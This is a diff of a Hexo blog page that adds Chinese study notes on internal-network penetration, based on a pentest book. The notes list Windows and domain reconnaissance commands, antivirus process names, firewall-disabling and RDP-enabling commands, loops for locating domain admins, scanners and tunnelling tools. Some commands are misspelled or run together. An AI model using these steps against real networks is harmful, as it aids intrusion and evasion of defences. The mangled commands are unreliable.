@@ -6,18 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Dont hit without hesitation | 不过是块石头而已</title>
+  <title>内网渗透 | 不过是块石头而已</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="许多年没碰github，心血来潮，重新部署，打算将这几年编写和收藏的markdown发上去~">
+  <meta name="description" content="内网渗透《内网安全攻防——渗透测试实战指南》笔记">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Dont hit without hesitation">
-<meta property="og:url" content="http://example.com/2022/04/27/Dont-hit-without-hesitation/index.html">
+<meta property="og:title" content="内网渗透">
+<meta property="og:url" content="http://example.com/2022/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="不过是块石头而已">
-<meta property="og:description" content="许多年没碰github，心血来潮，重新部署，打算将这几年编写和收藏的markdown发上去~">
+<meta property="og:description" content="内网渗透《内网安全攻防——渗透测试实战指南》笔记">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-04-27T07:22:54.000Z">
-<meta property="article:modified_time" content="2022-04-27T07:24:01.336Z">
+<meta property="article:published_time" content="2022-04-29T05:41:56.000Z">
+<meta property="article:modified_time" content="2022-04-29T05:42:15.800Z">
 <meta property="article:author" content="lam">
+<meta property="article:tag" content="内网">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="不过是块石头而已" type="application/atom+xml">
@@ -154,27 +155,816 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Dont-hit-without-hesitation" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-内网渗透" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Dont hit without hesitation
+      内网渗透
     </h1>
   
 
         
-        <a href="/2022/04/27/Dont-hit-without-hesitation/" class="archive-article-date">
-  	<time datetime="2022-04-27T07:22:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-27</time>
+        <a href="/2022/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="archive-article-date">
+  	<time datetime="2022-04-29T05:41:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>许多年没碰github，心血来潮，重新部署，打算将这几年编写和收藏的markdown发上去~</p>
+        <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>《内网安全攻防——渗透测试实战指南》笔记</p>
+<span id="more"></span>
+
+<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>信息收集目标：</p>
+<ul>
+<li>判断当前机器角色，是普通 Web 服务器、开发测试服务器、公共服务器、文件服务器、代理服务器、DNS 服务器还是存储服务器等等</li>
+<li>判断当前机器所处网络环境的拓扑结构，是对所处内网进行全面的信息收集，和分析整理，绘制大概的内网整体拓扑结构图</li>
+<li>判断当前机器所处区域，是指判断当前按机器处于网络拓扑中的哪个位置，是在 DMZ 区、办公区还是核心区</li>
+</ul>
+<h3 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h3><h4 id="手动收集"><a href="#手动收集" class="headerlink" title="手动收集"></a>手动收集</h4><p>本机信息包括系统、权限、内网 IP 地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，操作系统、应用软件、补丁、服务、杀毒软件一般是一键安装的。</p>
+<p>相关命令：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ipconfig /all</code></td>
+<td>获取本机网络配置信息</td>
+</tr>
+<tr>
+<td>&#96;&#96;systeminfo</td>
+<td>findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version”&#96;&#96;</td>
+</tr>
+<tr>
+<td><code>echo %PROCESSOR_ARCHITECTURE%</code></td>
+<td>查看系统架构</td>
+</tr>
+<tr>
+<td><code>wmic product get name,version</code></td>
+<td>查看安装软件信息</td>
+</tr>
+<tr>
+<td>&#96;&#96;powershell “GET-WmiObject -class Win32_Product</td>
+<td>Select-Object -Property name,version”&#96;&#96;</td>
+</tr>
+<tr>
+<td><code>wmic service list brief</code></td>
+<td>查看服务信息</td>
+</tr>
+<tr>
+<td><code>tasklist</code></td>
+<td>查看进程信息</td>
+</tr>
+<tr>
+<td><code>wmic process list brief</code></td>
+<td>查看进程信息</td>
+</tr>
+<tr>
+<td><code>wmic startup get command,caption</code></td>
+<td>查看启动程序信息</td>
+</tr>
+<tr>
+<td><code>schtasks /query /fo LIST /v</code></td>
+<td>查看计划任务</td>
+</tr>
+<tr>
+<td><code>net statistics workstation</code></td>
+<td>查看开机时间</td>
+</tr>
+<tr>
+<td><code>net user</code></td>
+<td>查看用户列表，可以寻找用户命名规律</td>
+</tr>
+<tr>
+<td><code>net localgroup administrators</code></td>
+<td>查看本地管理员，有时会有域用户被添加为域机器的本地管理员</td>
+</tr>
+<tr>
+<td><code>net session</code></td>
+<td>列出或断开本地计算机域所连接的客户端之间的会话</td>
+</tr>
+<tr>
+<td><code>netstat -ano</code></td>
+<td>查看端口信息</td>
+</tr>
+<tr>
+<td><code>system info</code></td>
+<td>查看补丁信息</td>
+</tr>
+<tr>
+<td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td>
+<td>查看安装在系统中的补丁</td>
+</tr>
+<tr>
+<td><code>net share</code></td>
+<td>查看本机共享列表</td>
+</tr>
+<tr>
+<td><code>wmic share name,path,status</code></td>
+<td>查看本机共享列表</td>
+</tr>
+<tr>
+<td><code>route print</code></td>
+<td>查看路由表</td>
+</tr>
+<tr>
+<td><code>arp -a</code></td>
+<td>查看MAC地址</td>
+</tr>
+<tr>
+<td><code>netsh firewall show config</code></td>
+<td>查看防火墙配置</td>
+</tr>
+<tr>
+<td><code>netsh firewall set opmode disable</code></td>
+<td>Windows Server 2003及以前的版本，禁用防火墙</td>
+</tr>
+<tr>
+<td><code>netsh advfirewall set allprofiles state off</code></td>
+<td>Windows Server 2003 之后版本，禁用防火墙</td>
+</tr>
+<tr>
+<td><code>netsh firewalll add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</code></td>
+<td>Windows Server 2003 之前，允许 nc 全部连接</td>
+</tr>
+<tr>
+<td><code>netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</code></td>
+<td>Windows Server 2003之后，允许 nc 进入</td>
+</tr>
+<tr>
+<td><code>netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</code></td>
+<td>Windows Server 2003 之后，允许 nc 出</td>
+</tr>
+<tr>
+<td><code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocal=TCP dir=in localport=3389 action=allow</code></td>
+<td>Windows Server 2003之后，允许3389</td>
+</tr>
+<tr>
+<td><code> netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</code></td>
+<td>自定义防火墙日志文件位置</td>
+</tr>
+<tr>
+<td><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></td>
+<td>查看代理配置情况</td>
+</tr>
+<tr>
+<td><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></td>
+<td>查看远程连接端口(十六进制)</td>
+</tr>
+<tr>
+<td><code>wmic path win32_terminalservicesetting where (__classCLASS !=&quot;&quot;) call setallowtsconnections 1</code></td>
+<td>Windows Server 2003 开启 3389 端口</td>
+</tr>
+<tr>
+<td><code>wmic /namespace:\\root\cimv2\terminalservices path win32_terminalsetting where (__class !=&quot;&quot;) call setallowtsconnections 1</code></td>
+<td>Windows Server 2008 和 2012 开启3389端口</td>
+</tr>
+<tr>
+<td><code>wmic /namespace:\\root\cimv2\terminalservices path  win32_terminalgeneralsetting where (TermicalName=&#39;RDP-Tcp&#39;) call  setuserauthenticationrequired 1</code></td>
+<td>Windows Server 2008 和 2012 开启3389端口</td>
+</tr>
+<tr>
+<td><code>reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DOWRD /d 0 /f</code></td>
+<td>Windows Server 2008 和 2012 开启3389端口</td>
+</tr>
+</tbody></table>
+<p>常见杀软进程名称：</p>
+<table>
+<thead>
+<tr>
+<th>进程</th>
+<th>软件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>360sd.exe</td>
+<td>360杀毒</td>
+</tr>
+<tr>
+<td>360tray.exe</td>
+<td>360实时防护</td>
+</tr>
+<tr>
+<td>ZhuDongFangYu.exe</td>
+<td>360主动防御</td>
+</tr>
+<tr>
+<td>KSafeTray.exe</td>
+<td>金山卫士</td>
+</tr>
+<tr>
+<td>SafeDogUpdateCenter.exe</td>
+<td>服务器安全狗</td>
+</tr>
+<tr>
+<td>McAfee McShield.exe</td>
+<td>McAfee</td>
+</tr>
+<tr>
+<td>egui.exe</td>
+<td>NOD32</td>
+</tr>
+<tr>
+<td>AVP.EXE</td>
+<td>卡巴斯基</td>
+</tr>
+<tr>
+<td>avguard.exe</td>
+<td>小红伞</td>
+</tr>
+<tr>
+<td>bdagent.exe</td>
+<td>BitDefender</td>
+</tr>
+</tbody></table>
+<h4 id="自动收集"><a href="#自动收集" class="headerlink" title="自动收集"></a>自动收集</h4><p>使用 WMIC(Windows Management Instrumentation  Command-Line)，脚本自动获取所需的信息。默认情况下，任何版本的 Windows XP 的低权限用户不能访问 WMIC，Windows 7 以上版本的低权限用户允许访问 WMIC 并执行相关查询操作，推荐脚本：<a target="_blank" rel="noopener" href="https://1klnd.github.io/2020/07/29/intranet/wmic_info.bat">wmic_info.bat</a></p>
+<h4 id="Empire-下的主机信息收集"><a href="#Empire-下的主机信息收集" class="headerlink" title="Empire 下的主机信息收集"></a>Empire 下的主机信息收集</h4><pre><code>usemodule situational_awareness/host/winenumusemodule situational_awareness/host/computerdetails
+</code></pre>
+<h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><p>如果内网中存在域，本地普通用户只能查询本机信息，无法查询域内信息；本地管理员和域用户可以查询域内信息。</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>whoami</code></td>
+<td>查询当前权限</td>
+</tr>
+<tr>
+<td><code>whoami /all</code></td>
+<td>查询域 SID</td>
+</tr>
+<tr>
+<td><code>net user username /domain</code></td>
+<td>查询指定用户的详细信息</td>
+</tr>
+</tbody></table>
+<h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>获取了本机信息之后，需要判断内网中是否存在域，如果存在，当前主机是否在域内。通常有多种方法。</p>
+<h4 id="查看网络配置"><a href="#查看网络配置" class="headerlink" title="查看网络配置"></a>查看网络配置</h4><p>使用 <code>ipconfig /all</code> 查看网关 IP 地址、DNS IP地址、域名、本机是否和 DNS 处于同一网段等信息，然后通过反向解析查询命令 <code>nslookup example.domainname</code> 解析域名的 IP 地址，判断域控制器和 DNS 服务器是否是同一台服务器。</p>
+<h4 id="查看系统详细信息"><a href="#查看系统详细信息" class="headerlink" title="查看系统详细信息"></a>查看系统详细信息</h4><p>使用 <code>systeminfo</code> 查看系统详细信息，域 为域名，如果 域 为 WORKGROUP 则本机不在域内，登陆服务器为域控。</p>
+<h4 id="查询当前登陆域及登录用户信息"><a href="#查询当前登陆域及登录用户信息" class="headerlink" title="查询当前登陆域及登录用户信息"></a>查询当前登陆域及登录用户信息</h4><p>使用 <code>net config workstation</code>，工作站域 DNS 名称为域名，登陆域表示当前登录用户是域用户或者本地用户，</p>
+<h4 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h4><p>使用 <code>net time /domain</code> 查询时间，由于与服务器通常会同时作为时间服务器，可以用于判断主域。执行结果分为以下几种情况：</p>
+<ul>
+<li><p>存在域，但当前用户不是域用户</p>
+<pre><code>发生系统错误 5拒绝访问
+</code></pre>
+</li>
+<li><p>存在域，且当前用户是域用户</p>
+<pre><code>\\DC.hacke.testlab 的当前时间是 2020/7/29 18:04:07
+</code></pre>
+</li>
+<li><p>当前网络环境为工作组，不存在域</p>
+<pre><code>找不到域 WORKGROUP 的域控制器
+</code></pre>
+</li>
+</ul>
+<h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><h4 id="使用-NetBIOS-快速探测内网"><a href="#使用-NetBIOS-快速探测内网" class="headerlink" title="使用 NetBIOS 快速探测内网"></a>使用 NetBIOS 快速探测内网</h4><p>NetBIOS 是局域网程序使用的一种 API为应用程序提供了请求低级别服务的统一指令集，为局域网提供了网络及其他特殊功能，几乎所有的局域网都是在 NetBIOS协议的基础上工作的，推荐优先使用。</p>
+<p>使用 nbtscan 扫描内网，<a target="_blank" rel="noopener" href="https://1klnd.github.io/2020/07/29/intranet/nbtscan-1.0.35.exe">Windows 版</a>，<a target="_blank" rel="noopener" href="https://1klnd.github.io/2020/07/29/intranet/nbtscan-1.0.35.exe">Linux版</a>，不输入任何参数可查看帮助</p>
+<pre><code>nbtscan.exe 192.168.1.0/24
+</code></pre>
+<p>扫描结果第一列为 IP 地址，第二列为所在域，第三列为开启的服务</p>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SHARING</td>
+<td>该机器中存在正在运行的文件和打印共享服务，但不一定有内容共享</td>
+</tr>
+<tr>
+<td>DC</td>
+<td>可能是域控制器</td>
+</tr>
+<tr>
+<td>U&#x3D;USER</td>
+<td>可能有登录名为 USER 的用户</td>
+</tr>
+<tr>
+<td>IIS</td>
+<td>可能安装 IIS 服务器</td>
+</tr>
+<tr>
+<td>EXCHANGE</td>
+<td>可能安装了 Exchange</td>
+</tr>
+<tr>
+<td>NOTES</td>
+<td>可能安装了 Lotus Notes 电子邮件客户端</td>
+</tr>
+<tr>
+<td>?</td>
+<td>没有识别出该机器的 NetBIOS 资源，可使用 <code>-F</code>再次扫描</td>
+</tr>
+</tbody></table>
+<h4 id="利用-ICMP-协议快速探测内网"><a href="#利用-ICMP-协议快速探测内网" class="headerlink" title="利用 ICMP 协议快速探测内网"></a>利用 ICMP 协议快速探测内网</h4><p>扫描 C 段：</p>
+<pre><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot;
+</code></pre>
+<p>也可利用 VBS 脚本</p>
+<h4 id="利用-ARP-探测内网"><a href="#利用-ARP-探测内网" class="headerlink" title="利用 ARP 探测内网"></a>利用 ARP 探测内网</h4><p>使用 arpscan 利用 arp 协议扫描，<a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan">Windows 版</a>，Kali 可以使用 apt 安装</p>
+<pre><code>arpscan.exe -t 192.168.1.0/24
+</code></pre>
+<p>也可以使用 Empire 的 <code>arpscan</code> 模块或者 Nishang 中的 <code>Invoke-ARPScan.ps1</code> 脚本</p>
+<h4 id="通过常规-TCP-x2F-UDP-端口扫描探测内网"><a href="#通过常规-TCP-x2F-UDP-端口扫描探测内网" class="headerlink" title="通过常规 TCP&#x2F;UDP 端口扫描探测内网"></a>通过常规 TCP&#x2F;UDP 端口扫描探测内网</h4><p>使用 ScanLine 探测端口</p>
+<pre><code>scanline -h -t 22,80-89,110,389,445,3389,1433,2049  -u 53,161 -O C:\Windows\temp\log.txt -p 192.168.1.1-254 /b
+</code></pre>
+<h3 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h3><h4 id="利用-telnet-扫描"><a href="#利用-telnet-扫描" class="headerlink" title="利用 telnet 扫描"></a>利用 telnet 扫描</h4><p>如果单纯检查某个高危端口是否开放可以选择 telnet</p>
+<pre><code>telnet DC 1433telnet 192.168.1.4 22
+</code></pre>
+<h4 id="S-扫描器"><a href="#S-扫描器" class="headerlink" title="S 扫描器"></a>S 扫描器</h4><p>S 扫描器适合运行于 Windows Server 2003 以下的机器，扫描结果默认保存在安装目录下的 result.txt 文件中，推荐使用 TCP 扫描</p>
+<pre><code>S.exe TCP 192.168.1.1 192.168.1.254 445,3389 /Banner /save
+</code></pre>
+<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>Metasploit 不仅提供了多种端口扫描技术，还提供了与其他扫描工具的接口</p>
+<pre><code>use auxiliary/scanner/portscan/tcp
+</code></pre>
+<h4 id="PowerSploit-的-Invoke-portscan-ps1"><a href="#PowerSploit-的-Invoke-portscan-ps1" class="headerlink" title="PowerSploit 的 Invoke-portscan.ps1"></a>PowerSploit 的 Invoke-portscan.ps1</h4><h4 id="Nishang-的-Invoke-PortScan-模块"><a href="#Nishang-的-Invoke-PortScan-模块" class="headerlink" title="Nishang 的 Invoke-PortScan 模块"></a>Nishang 的 Invoke-PortScan 模块</h4><h4 id="Banner-信息"><a href="#Banner-信息" class="headerlink" title="Banner 信息"></a>Banner 信息</h4><p>扫描到开放端口后，可以使用 nc 或者客户端连接端口获取 Banner 信息，用于在漏洞库中检索对应的 POC，EXP。常用漏洞库</p>
+<ul>
+<li>安全焦点中的 BugTraq</li>
+<li>Exploit-DB</li>
+</ul>
+<h3 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title="收集域内基础信息"></a>收集域内基础信息</h3><p>确定当前内网的域，以及所控制的主机在域内，就可以进行域内相关信息的收集，以下的方法都是通过 LDAP 协议到域控制器上进行查询，因此只有域用户和本地 System 用户具有权限。</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>net view /domain</code></td>
+<td>查询域</td>
+</tr>
+<tr>
+<td><code>net view /domain:HACKE</code></td>
+<td>查询域内所有主机</td>
+</tr>
+<tr>
+<td><code>net group /domain</code></td>
+<td>查询用户组列表</td>
+</tr>
+<tr>
+<td><code>net group &quot;domain computers&quot; /domain</code></td>
+<td>查询域成员</td>
+</tr>
+<tr>
+<td><code>net accounts /domain</code></td>
+<td>获取域密码策略</td>
+</tr>
+<tr>
+<td><code>nltest /domain_trusts</code></td>
+<td>查询域信任信息</td>
+</tr>
+</tbody></table>
+<h3 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nltest /DCLIST:hacke</code></td>
+<td>查看域控制器机器名</td>
+</tr>
+<tr>
+<td><code>nslookup -type=SRV _ldap._tcp</code></td>
+<td>查看域控制器主机名</td>
+</tr>
+<tr>
+<td><code>net time /domain</code></td>
+<td>查看时间</td>
+</tr>
+<tr>
+<td><code>net group &quot;Domain Controllers&quot; /domain</code></td>
+<td>查看域控制器组</td>
+</tr>
+<tr>
+<td><code>netdom query pdc</code></td>
+<td>查看域控制器机器名</td>
+</tr>
+</tbody></table>
+<h3 id="获取域内用户和管理员信息"><a href="#获取域内用户和管理员信息" class="headerlink" title="获取域内用户和管理员信息"></a>获取域内用户和管理员信息</h3><h4 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h4><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>net user /domain</code></td>
+<td>查询用户列表</td>
+</tr>
+<tr>
+<td><code>wmic useraccount get /all</code></td>
+<td>查询域内用户详细信息</td>
+</tr>
+<tr>
+<td><code>dsquery user</code></td>
+<td>查询存在的用户</td>
+</tr>
+<tr>
+<td><code>net localgroup administrators</code></td>
+<td>查询本地管理员组用户，Domain Admins 组的用户默认为域内机器的本笃管理员用户</td>
+</tr>
+</tbody></table>
+<h4 id="查询域管理员用户组"><a href="#查询域管理员用户组" class="headerlink" title="查询域管理员用户组"></a>查询域管理员用户组</h4><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>net group &quot;domain admins&quot; /domain</code></td>
+<td>查询域管理员用户</td>
+</tr>
+<tr>
+<td><code>net group &quot;Enterprise Admins&quot; /domain</code></td>
+<td>查询域管理员用户</td>
+</tr>
+</tbody></table>
+<h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>一个域中，当计算机加入域后，会默认给域管理员组赋予本地管理员权限。</p>
+<p>定位域管理员的方式，一是日志，二是会话。日志是指本地机器的管理员日志，可以通过脚本或 Wevtutil 工具导出查看。会话是指域内每台机器的登录会话，可以使用 netsess.exe 或 PowerView 等工具查询（可以匿名，不需要权限）。</p>
+<h4 id="常用域管理员定位工具"><a href="#常用域管理员定位工具" class="headerlink" title="常用域管理员定位工具"></a>常用域管理员定位工具</h4><p>假设已经取得了域内普通用户的权限，希望横向移动，需要知道域内用户登录的位置、他是否是任何系统的本地管理员、他所属的组、他是否有权访问文件共享等。枚举主机、用户和组有助于了解域内布局。</p>
+<p>常用域管理员定位工具有 psloggedon.exe、PVEFinADUser.exe、netsess.exe、以及 hunter、NetView 等。在 PowerShell 中，常用的是 PowerView。</p>
+<h3 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h3><h4 id="本机检查"><a href="#本机检查" class="headerlink" title="本机检查"></a>本机检查</h4><pre><code>net group &quot;Domain Admins&quot; /Domain	# 查看域管理员tasklist /v							# 列出本机的所有进程和进程用户，在其中寻找域管理员进程
+</code></pre>
+<h4 id="查询域控制器的域用户会话"><a href="#查询域控制器的域用户会话" class="headerlink" title="查询域控制器的域用户会话"></a>查询域控制器的域用户会话</h4><p>在域控制器中查找域用户会话列表，并将其于域管理员列表进行交叉引用，从而得到域管理会话的系统列表。</p>
+<p>查询域控制器列表，可以使用 LDAP 查询从 Domain Controllers 单元中收集的域控制器列表或者使用 <code>net group &quot;Domain Controllers&quot; /domain&quot;</code></p>
+<p>收集域管理员列表，可以使用 LDAP 查询或者使用 <code>net group &quot;Domain Admins&quot; /domain</code></p>
+<p>收集所有活动域的会话列表，可以使用 netsess.exe，<code>NetSess -h</code></p>
+<p>交叉引用域管理员列表和活动绘画列表，可以确定哪些 IP 地址有活动域令牌。将域控制器列表保存到 dcs.txt，域管理员列表保存到 admins.txt，执行</p>
+<pre><code>FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt;sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt |findstr /I %a 
+</code></pre>
+<p>类似的也可以使用 Get Domain Admins  脚本。</p>
+<h4 id="查询远程系统中运行的任务"><a href="#查询远程系统中运行的任务" class="headerlink" title="查询远程系统中运行的任务"></a>查询远程系统中运行的任务</h4><p>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以用以下方式查询系统中的域管理员任务，将目标域系统列表添加到 ips.txt，将收集到的域管理员列表添加到 names.txt</p>
+<pre><code>net group &quot;Domain Admins&quot; /domainFor /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;nul &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; nul &amp;&amp; echo [!] %n was found running a prosess on %i &amp;&amp; pause
+</code></pre>
+<h4 id="扫描远程系统的-NetBIOS-信息"><a href="#扫描远程系统的-NetBIOS-信息" class="headerlink" title="扫描远程系统的 NetBIOS 信息"></a>扫描远程系统的 NetBIOS 信息</h4><p>某些版本的 Windows 允许用户通过 NetBIOS 查询已登录用户，将目标域系统添加到 ips.txt，将收集到的域管理员列表添加到 admins.txt</p>
+<pre><code>for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;nul &gt; nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt;nul &amp;&amp; echo [!] %n was found logged into %i
+</code></pre>
+<p>也可以使用 nbtscan 工具，</p>
+<pre><code>for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;nul &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt;nul &amp;&amp; echo [!] %n was found logged into %i
+</code></pre>
+<h3 id="利用-PowerShell"><a href="#利用-PowerShell" class="headerlink" title="利用 PowerShell"></a>利用 PowerShell</h3><p>-</p>
+<h3 id="域分析工具-BloodHound"><a href="#域分析工具-BloodHound" class="headerlink" title="域分析工具 BloodHound"></a>域分析工具 BloodHound</h3><p>-</p>
+<h3 id="敏感数据的防护"><a href="#敏感数据的防护" class="headerlink" title="敏感数据的防护"></a>敏感数据的防护</h3><p>-</p>
+<h3 id="分析域内网段划分情况和拓扑结构"><a href="#分析域内网段划分情况和拓扑结构" class="headerlink" title="分析域内网段划分情况和拓扑结构"></a>分析域内网段划分情况和拓扑结构</h3><p>-</p>
+<h2 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><p>常见隧道：</p>
+<ul>
+<li>网络层：IPv6，ICMP，GRE</li>
+<li>传输层：TCP，UDP，端口转发</li>
+<li>应用层：SSH，HTTP，HTTPS，DNS</li>
+</ul>
+<h4 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h4><ul>
+<li>ICMP：<code>ping </code></li>
+<li>TCP：<code>nc  </code></li>
+<li>HTTP：<code>curl :</code></li>
+<li>DNS：<code>nslookup  </code>，<code>dig @  </code></li>
+</ul>
+<p>有时流量不能直接流出，需要在内网中设置代理服务器，常用于通过企业办公网段上网的场景。判断方式：查看网络连接是否有与其他主机的8080端口（大概率）存在连接；查看内网中是否有主机名类似于 “proxy” 的机器；查看 IE 浏览器的直接代理；根据 pac 文件的路径（本地或远程），下载并查看；执行以下命令确认</p>
+<pre><code>curl www.baidu.com						# 不通curl -X &lt;proxyip:port&gt; www.baidu.com	# 通
+</code></pre>
+<h3 id="网络层隧道"><a href="#网络层隧道" class="headerlink" title="网络层隧道"></a>网络层隧道</h3><h4 id="IPv6-隧道"><a href="#IPv6-隧道" class="headerlink" title="IPv6 隧道"></a>IPv6 隧道</h4><p>IPv6 隧道技术指通过 IPv4 隧道传递 IPv6 数据报文的技术。</p>
+<p>工具：socat, 6tunnel, nt6tunnel</p>
+<h4 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h4><p>工具：<a target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh">icmpsh</a>, <a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">pingtunnel</a></p>
+<h3 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h3><p>工具：lcx, nc, powercat</p>
+<h3 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h3><p>SSH DNS</p>
+<p>dnscat2</p>
+<h3 id="Socks-代理"><a href="#Socks-代理" class="headerlink" title="Socks 代理"></a>Socks 代理</h3><p>earthworm</p>
+<p>reGeorg</p>
+<p>sSocks</p>
+<p>SocksCap64</p>
+<p>Proxifier</p>
+<p>ProxyChains</p>
+<h3 id="压缩数据"><a href="#压缩数据" class="headerlink" title="压缩数据"></a>压缩数据</h3><h4 id="rar-exe"><a href="#rar-exe" class="headerlink" title="rar.exe"></a>rar.exe</h4><p>将E:\webs\目录下的所有内容打包为1.rar放入E:\webs\目录下</p>
+<pre><code>rar.exe a -k -r -s -m3 E:\webs\1.rar E:\webs\
+</code></pre>
+<p>将E:\webs\1.rar解压到当前根目录下</p>
+<pre><code>rar.exe e E:\webs\1.rar
+</code></pre>
+<p>分卷压缩、解压</p>
+<p>分卷压缩E盘API目录下的所有文件及文件夹，设置每个分卷为20M</p>
+<pre><code>rar.exe a -m0 -r -v20m E:\test.rar E:\API
+</code></pre>
+<p>将E:\test.part01.rar解压到E盘的x1目录下</p>
+<pre><code>rar.exe x E:\test.part01.rar E:\x1
+</code></pre>
+<h4 id="7zip"><a href="#7zip" class="headerlink" title="7zip"></a>7zip</h4><h3 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a>上传和下载</h3><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><h4 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h4><p>download.vbs代码：</p>
